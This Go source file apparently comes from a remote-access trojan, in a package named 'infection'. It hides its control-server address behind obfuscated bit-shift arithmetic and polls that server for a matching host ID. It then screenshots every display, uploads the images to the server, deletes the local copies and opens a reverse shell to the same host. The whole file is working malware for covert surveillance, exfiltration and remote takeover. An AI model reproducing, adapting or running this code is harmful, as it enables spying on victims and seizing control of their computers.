package tunnel

import (
	"encoding/json"
	"fmt"
	"github.com/kbinani/screenshot"
	"github.com/parnurzeal/gorequest"
	"image/png"
	"infection/tunnel/reverse"
	"infection/util/lib"
	"os"
	"runtime"
	"unsafe"
)

const (
	EAX = uint8(unsafe.Sizeof(true))
	ONE = "EAX"
)

func GetServerAddr() string {
	var str []byte
	str = append(str, (((EAX<<EAX|EAX)<<EAX|EAX)<<EAX|EAX)<<EAX<<EAX<<EAX)
	str = append(str, ((EAX<<EAX|EAX)<<EAX<<EAX<<EAX<<EAX<<EAX | EAX))
	str = append(str, ((((EAX<<EAX|EAX)<<EAX|EAX)<<EAX|EAX)<<EAX<<EAX<<EAX | EAX))
	str = append(str, ((EAX<<EAX|EAX)<<EAX<<EAX<<EAX<<EAX<<EAX | EAX))
	str = append(str, ((EAX<<EAX|EAX)<<EAX<<EAX|EAX)<<EAX<<EAX<<EAX)
	str = append(str, (((EAX<<EAX<<EAX|EAX)<<EAX|EAX)<<EAX|EAX)<<EAX)
	str = append(str, ((((EAX<<EAX|EAX)<<EAX|EAX)<<EAX<<EAX<<EAX|EAX)<<EAX | EAX))
	str = append(str, (((EAX<<EAX|EAX)<<EAX|EAX)<<EAX<<EAX|EAX)<<EAX<<EAX)
	str = append(str, (((EAX<<EAX|EAX)<<EAX|EAX)<<EAX<<EAX<<EAX|EAX)<<EAX)
	str = append(str, ((EAX<<EAX|EAX)<<EAX<<EAX<<EAX<<EAX<<EAX | EAX))
	str = append(str, ((((EAX<<EAX|EAX)<<EAX<<EAX|EAX)<<EAX|EAX)<<EAX|EAX)<<EAX)
	str = append(str, ((((EAX<<EAX|EAX)<<EAX<<EAX<<EAX|EAX)<<EAX|EAX)<<EAX | EAX))
	str = append(str, (((EAX<<EAX|EAX)<<EAX<<EAX|EAX)<<EAX|EAX)<<EAX<<EAX)
	str = append(str, (((EAX<<EAX|EAX)<<EAX<<EAX<<EAX|EAX)<<EAX<<EAX | EAX))
	str = append(str, ((EAX<<EAX|EAX)<<EAX<<EAX<<EAX|EAX)<<EAX<<EAX)
	str = append(str, (((EAX<<EAX<<EAX|EAX)<<EAX|EAX)<<EAX|EAX)<<EAX)
	str = append(str, ((((EAX<<EAX|EAX)<<EAX<<EAX|EAX)<<EAX|EAX)<<EAX|EAX)<<EAX)
	str = append(str, (((EAX<<EAX|EAX)<<EAX<<EAX<<EAX|EAX)<<EAX<<EAX | EAX))
	str = append(str, (((EAX<<EAX|EAX)<<EAX|EAX)<<EAX<<EAX|EAX)<<EAX<<EAX)
	str = append(str, (((EAX<<EAX|EAX)<<EAX|EAX)<<EAX<<EAX|EAX)<<EAX)
	str = append(str, ((EAX<<EAX|EAX)<<EAX<<EAX<<EAX|EAX)<<EAX)
	str = append(str, ((((EAX<<EAX|EAX)<<EAX<<EAX|EAX)<<EAX|EAX)<<EAX | EAX))
	str = append(str, (EAX<<EAX|EAX)<<EAX<<EAX<<EAX<<EAX)
	str = append(str, ((EAX<<EAX|EAX)<<EAX<<EAX<<EAX<<EAX | EAX))
	str = append(str, (((EAX<<EAX|EAX)<<EAX<<EAX|EAX)<<EAX<<EAX | EAX))
	return string(str)
}

type Check struct {
	Hostid string `json:"hostid"`
}

func getscreenshot() []string {
	n := screenshot.NumActiveDisplays()
	filenames := []string{}
	var fpth string
	for i := 0; i < n; i++ {
		bounds := screenshot.GetDisplayBounds(i)

		img, err := screenshot.CaptureRect(bounds)
		if err != nil {
			panic(err)
		}
		if runtime.GOOS == "windows" {
			fpth = `C:\Windows\Temp\`
		} else {
			fpth = `/tmp/`
		}
		fileName := fmt.Sprintf("maskScr-%d-%dx%d.png", i, bounds.Dx(), bounds.Dy())
		fullpath := fpth + fileName
		filenames = append(filenames, fullpath)
		file, _ := os.Create(fullpath)

		defer file.Close()
		png.Encode(file, img)
	}

	return filenames
}
func Tunnel(addr string) {
	var check Check
	resp, body, _ := gorequest.New().
		Get("http://" + addr + ":5002/browser/tunnel").
		End()
	if resp.StatusCode == 200 && body != "" {
		if err := json.Unmarshal([]byte(body), &check); err == nil {
			// if not need  dont open the tunnel to revert shell
			if check.Hostid == lib.HOSTID {
				filenames := getscreenshot()
				finflag := make(chan string)
				for _, fname := range filenames {
					go lib.SingleFile(fname, "http://"+addr+":5002/browser/browserbag", finflag)
					<-finflag
					go lib.Removetempimages(filenames, finflag)
				}
				reverse.CreateRevShell("tcp", addr+":5004")
			} else {
				return
			}
		}
	}
	//ReverseShell.CreateRevShell("tcp", GetServerAddr())
	//ReverseShell.CreateRevShell("tcp", "127.0.0.1:8443")
	//reverse.CreateRevShell("tcp", "target:8443")
	//time.Sleep(10 * time.Second)
	//ReverseShell.DestroyShell()
}
